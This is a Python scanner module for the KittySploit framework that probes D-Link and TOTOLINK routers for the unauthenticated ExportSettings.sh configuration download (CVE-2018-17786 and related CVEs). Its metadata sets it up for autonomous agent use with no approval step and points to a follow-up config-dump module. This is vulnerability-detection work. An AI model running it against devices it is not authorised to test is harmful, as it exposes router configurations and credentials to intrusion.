#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""D-Link / TOTOLINK unauthenticated ExportSettings.sh config download."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'D-Link/TOTOLINK - ExportSettings.sh Unauth Config Download',
        'description': (
            'Various D-Link and TOTOLINK devices expose /cgi-bin/ExportSettings.sh without '
            'authentication, allowing download of device configuration backups '
            '(CVE-2018-17786 / CVE-2022-32993 / CVE-2023-53896).'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2018', 'cve2022', 'cve2023', 'dlink',
            'totolink', 'router', 'config', 'exposure', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'admin_surface', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [
                    'auxiliary/admin/http/dlink_exportsettings_config_dump',
                ],
            },
        },
        'references': [
            'https://xz.aliyun.com/t/2834',
            'https://www.exploit-db.com/exploits/51556',
            'https://nvd.nist.gov/vuln/detail/CVE-2018-17786',
        ],
        'cve': 'CVE-2018-17786',
    }

    def run(self):
        path = '/cgi-bin/ExportSettings.sh'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        ctype = (r.headers.get('Content-Type') or r.headers.get('content-type') or '')
        cdisp = (
            r.headers.get('Content-Disposition')
            or r.headers.get('content-disposition')
            or ''
        )
        if 'application/octet-stream' not in ctype.lower():
            return False
        if not re.search(
            r'attachment;\s*filename="[^"]+\.(dat|bin)"',
            cdisp,
            re.I,
        ):
            return False
        self.set_info(
            severity='critical',
            reason='Unauthenticated ExportSettings.sh config download',
            path=path,
            filename=cdisp,
        )
        return True
